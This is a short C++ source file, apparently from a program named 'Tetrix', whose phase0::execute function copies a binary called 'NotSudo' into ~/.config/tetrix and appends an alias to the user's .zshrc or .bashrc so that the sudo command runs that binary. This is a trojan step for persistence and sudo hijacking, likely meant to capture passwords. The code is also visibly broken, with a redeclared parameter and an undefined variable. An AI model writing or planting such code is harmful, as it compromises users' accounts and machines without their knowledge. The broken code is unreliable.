#include "phase0.h"
#include <fstream>
#include <iostream>
#include <string>

phase0::phase0()
{

}

int phase0::execute(std::string infile)
{
	//Adele's phase 1 code goes here.
	std::string homedir = std::getenv("HOME");
	std::string infile = homedir + "/.zshrc";
	std::ifstream rcfile(s,std::ifstream::in);
	if(!rcfile.is_open())
	{
		infile = homedir + "/.bashrc";
		rcfile.close();
		rcfile.clear();
		rcfile.open(s);
	}

	system("mkdir -p "+homedir+"/.config/tetrix/");
	system("cp ./resources/NotSudo "+homedir+"/.config/tetrix/NotSudo");
	system("cp ./Tetrix "+homedir+"/.config/tetrix/Tetrix");
	std::ifstream fs(infile,std::ifstream::in);
	std::string file="";
	if(fs.is_open())
	{
		std::string line{""};
		while(std::getline(fs,line))
		{
			file += line + "\n";
		}
	}
	fs.close();
	fs.clear();
	file += "alias sudo='"+homedir+"/.config/tetrix/NotSudo'\n";

	std::ofstream ofs(infile,std::ifstream::out);
	ofs << file;
	ofs.close();
	ofs.clear();

	rcfile.close();
	rcfile.clear();
	//Done!
	return 0;
}
